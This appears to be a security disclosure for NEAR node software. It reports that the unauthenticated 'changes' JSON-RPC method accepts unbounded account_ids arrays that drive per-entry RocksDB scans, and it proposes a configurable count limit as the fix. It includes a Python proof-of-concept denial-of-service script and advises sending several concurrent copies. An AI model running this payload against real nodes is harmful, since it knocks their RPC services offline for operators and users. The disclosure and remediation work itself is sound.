### Title
Unbounded `account_ids` / `keys` Arrays in `changes` RPC Method Enable Non-Network-Level DoS via Unbounded RocksDB Scans - (`chain/jsonrpc/src/lib.rs`, `chain/chain/src/store/mod.rs`)

### Summary

The `changes` / `EXPERIMENTAL_changes` JSON-RPC method accepts a `StateChangesRequestView` whose `account_ids` (or `keys`) arrays have no upper-bound validation. Each entry causes one or more RocksDB prefix scans in `get_state_changes`. An unprivileged caller can pack ~158,000 account IDs into a single 10 MB request and force the `ViewClientActor` to execute that many disk I/O operations synchronously, exhausting its thread pool and making the RPC server unresponsive. The fix requires no protocol change.

### Finding Description

`StateChangesRequestView` is defined in `core/primitives/src/views.rs` with five variants, all carrying unbounded `Vec<AccountId>` or `Vec<AccountWithPublicKey>` fields:

```rust
pub enum StateChangesRequestView {
    AccountChanges        { account_ids: Vec<AccountId> },
    SingleAccessKeyChanges{ keys: Vec<AccountWithPublicKey> },
    AllAccessKeyChanges   { account_ids: Vec<AccountId> },
    ContractCodeChanges   { account_ids: Vec<AccountId> },
    DataChanges           { account_ids: Vec<AccountId>, key_prefix: StoreKey },
}
``` [1](#0-0) 

The `changes_in_block_by_type` handler in `chain/jsonrpc/src/lib.rs` passes the request directly to `GetStateChanges` without any count check:

```rust
let changes = self
    .view_client_send(GetStateChanges {
        block_hash,
        state_changes_request: request.state_changes_request,
    })
    .await?;
``` [2](#0-1) 

`get_state_changes` in `chain/chain/src/store/mod.rs` iterates over every entry and issues a separate RocksDB call for each one. For `AllAccessKeyChanges` and `DataChanges` it issues a **prefix scan** (more expensive than an exact lookup):

```rust
StateChangesRequest::AllAccessKeyChanges { account_ids } => {
    for account_id in account_ids {
        let data_key = trie_key_parsers::get_raw_prefix_for_access_keys(account_id);
        let storage_key = KeyForStateChanges::from_raw_key(block_hash, &data_key);
        let changes_per_key_prefix = storage_key.find_iter(&store);
        changes.extend(StateChanges::from_access_key_changes(changes_per_key_prefix));
    }
}
``` [3](#0-2) 

The only guard in the entire path is the 10 MB HTTP body limit (`json_payload_max_size`, default 10 MB): [4](#0-3) 

A NEAR account ID is at most 64 bytes. In JSON array form each entry costs ≈ 68 bytes (`"` + 64 chars + `"` + `,`). With a 10 MB body:

```
10,485,760 / 68 ≈ 154,200 account IDs per request
```

No analogous limit exists anywhere in the parsing or dispatch path. A grep for `max_account_ids`, `account_ids_limit`, `MAX_ACCOUNT_IDS`, or `account_ids.len()` returns zero results in the production code.

Contrast this with other methods that do enforce limits:
- `EXPERIMENTAL_receipt_to_tx` enforces `receipt_to_tx_max_hint_window` and `receipt_to_tx_max_outcomes_per_request`. [5](#0-4) 
- `view_access_key_list` enforces `view_access_keys_limit`. [6](#0-5) 
- `EXPERIMENTAL_view_state` enforces `MAX_VIEW_STATE_PAGE_ITEMS`. [7](#0-6) 

The `changes` method has no equivalent guard.

### Impact Explanation

`ViewClientActor` is a multithread actor. Each `changes` request with 154,000 account IDs occupies one worker thread for the entire duration of ~154,000 RocksDB calls. Sending a small number of such requests concurrently (one per available thread) saturates the actor's thread pool. Subsequent legitimate RPC calls (`tx`, `query`, `block`, etc.) queue behind them and time out. The node's RPC surface becomes unresponsive without any consensus or state impact.

This is a non-network-level DoS (application layer, RPC server only) fixable without a hardfork by adding a count check in the request parser.

### Likelihood Explanation

The `changes` endpoint is publicly documented, unauthenticated, and reachable from any HTTP client. No tokens, keys, or privileged access are required. The attack payload is a single well-formed JSON-RPC request within the default 10 MB body limit. A single attacker with a standard internet connection can sustain the attack indefinitely.

### Recommendation

Add a maximum count check in the `RpcRequest::parse()` implementation for `RpcStateChangesInBlockByTypeRequest` (analogous to the existing `validate_view_state_pagination` guard):

```rust
const MAX_STATE_CHANGES_ACCOUNT_IDS: usize = 1_000;

impl RpcRequest for RpcStateChangesInBlockByTypeRequest {
    fn parse(value: Value) -> Result<Self, RpcParseError> {
        let request: Self = Params::parse(value)?;
        let count = match &request.state_changes_request {
            StateChangesRequestView::AccountChanges { account_ids }
            | StateChangesRequestView::AllAccessKeyChanges { account_ids }
            | StateChangesRequestView::ContractCodeChanges { account_ids }
            | StateChangesRequestView::DataChanges { account_ids, .. } => account_ids.len(),
            StateChangesRequestView::SingleAccessKeyChanges { keys } => keys.len(),
        };
        if count > MAX_STATE_CHANGES_ACCOUNT_IDS {
            return Err(RpcParseError(format!(
                "too many account_ids/keys: {count} > {MAX_STATE_CHANGES_ACCOUNT_IDS}"
            )));
        }
        Ok(request)
    }
}
```

The limit should be operator-configurable (like `view_access_keys_limit`) so archival nodes can raise it.

### Proof of Concept

```python
import json, requests

# Build a request with ~150,000 account IDs, each 64 chars (max valid NEAR account ID length)
account_id = "a" * 63 + ".near"  # 68 bytes in JSON
num_ids = 150_000
payload = {
    "jsonrpc": "2.0",
    "id": "dos",
    "method": "changes",
    "params": {
        "block_id": "latest",
        "changes_type": "all_access_key_changes",
        "account_ids": [account_id] * num_ids,
    }
}
# Payload size: ~150,000 * 68 ≈ 10.2 MB (just under the 10 MB limit with shorter IDs)

import time
start = time.time()
r = requests.post("http://<node>:3030", json=payload, timeout=60)
print(f"elapsed: {time.time() - start:.1f}s, status: {r.status_code}")
# Expected: request ties up a ViewClientActor thread for several seconds.
# Sending 4–8 concurrent copies exhausts the thread pool.
```

Each `all_access_key_changes` entry triggers `find_iter` (a RocksDB prefix scan) in `get_state_changes`. [3](#0-2)  With 150,000 entries and no limit, the ViewClientActor thread is occupied for the full scan duration. The `changes_in_block_by_type` handler has no early-exit or count guard before dispatching to the actor. [8](#0-7)

### Citations

**File:** core/primitives/src/views.rs (L2758-2776)
```rust
pub enum StateChangesRequestView {
    AccountChanges {
        account_ids: Vec<AccountId>,
    },
    SingleAccessKeyChanges {
        keys: Vec<AccountWithPublicKey>,
    },
    AllAccessKeyChanges {
        account_ids: Vec<AccountId>,
    },
    ContractCodeChanges {
        account_ids: Vec<AccountId>,
    },
    DataChanges {
        account_ids: Vec<AccountId>,
        #[serde(rename = "key_prefix_base64")]
        key_prefix: StoreKey,
    },
}
```

**File:** chain/jsonrpc/src/lib.rs (L140-148)
```rust
pub struct RpcLimitsConfig {
    /// Maximum byte size of the json payload.
    pub json_payload_max_size: usize,
}

impl Default for RpcLimitsConfig {
    fn default() -> Self {
        Self { json_payload_max_size: 10 * 1024 * 1024 }
    }
```

**File:** chain/jsonrpc/src/lib.rs (L2075-2107)
```rust
    async fn changes_in_block_by_type(
        &self,
        request: RpcStateChangesInBlockByTypeRequest,
        source: RequestSource,
    ) -> Result<RpcStateChangesInBlockResponse, RpcStateChangesError> {
        let block: near_primitives::views::BlockView =
            self.view_client_send(GetBlock(request.block_reference)).await?;

        let block_hash = block.header.hash;

        if source == RequestSource::Coordinator {
            let epoch_id = EpochId(block.header.epoch_id);
            let shard_layout =
                self.shard_layout_for_epoch(&epoch_id).map_err(to_state_changes_internal)?;
            let required: Vec<ShardUId> =
                extract_target_shards(&request.state_changes_request, &shard_layout)
                    .into_iter()
                    .map(|shard_id| ShardUId::from_shard_id_and_layout(shard_id, &shard_layout))
                    .collect();
            if !required.is_empty() {
                self.ensure_chunks_applied(&block_hash, &required).await?;
            }
        }

        let changes = self
            .view_client_send(GetStateChanges {
                block_hash,
                state_changes_request: request.state_changes_request,
            })
            .await?;

        Ok(RpcStateChangesInBlockResponse { block_hash: block.header.hash, changes })
    }
```

**File:** chain/chain/src/store/mod.rs (L710-718)
```rust
            StateChangesRequest::AllAccessKeyChanges { account_ids } => {
                let mut changes = StateChanges::new();
                for account_id in account_ids {
                    let data_key = trie_key_parsers::get_raw_prefix_for_access_keys(account_id);
                    let storage_key = KeyForStateChanges::from_raw_key(block_hash, &data_key);
                    let changes_per_key_prefix = storage_key.find_iter(&store);
                    changes.extend(StateChanges::from_access_key_changes(changes_per_key_prefix));
                }
                changes
```

**File:** chain/client/src/view_client_actor.rs (L1302-1310)
```rust
    let effective_window = msg.window.unwrap_or(DEFAULT_HINT_WINDOW);
    let max_hint_window = actor.config.receipt_to_tx_max_hint_window;
    let max_hop_distance = actor.config.receipt_to_tx_max_hop_distance;
    if hint_provided && effective_window > max_hint_window {
        return Err(GetReceiptToTxError::WindowTooLarge {
            requested: effective_window,
            maximum: max_hint_window,
        });
    }
```

**File:** runtime/runtime/src/state_viewer/mod.rs (L195-205)
```rust
        let max = self.access_keys_limit;
        let paginated = after.is_some() || limit.is_some();

        let item_cap: Option<u32> = if paginated {
            // An explicit page size larger than the configured maximum is
            // clamped down rather than rejected; with no explicit page size we
            // fall back to the configured maximum.
            Some(limit.map_or(max, |requested| requested.get().min(max)))
        } else {
            None
        };
```

**File:** runtime/runtime/src/state_viewer/mod.rs (L366-373)
```rust
        const MAX_VIEW_STATE_PAGE_ITEMS: u32 = 10_000;
        const MAX_VIEW_STATE_PAGE_BYTES: u64 = 50_000;

        let (item_cap, byte_cap) = if paginated {
            let items = limit
                .map_or(MAX_VIEW_STATE_PAGE_ITEMS, NonZeroU32::get)
                .min(MAX_VIEW_STATE_PAGE_ITEMS);
            (Some(items), Some(MAX_VIEW_STATE_PAGE_BYTES))
```
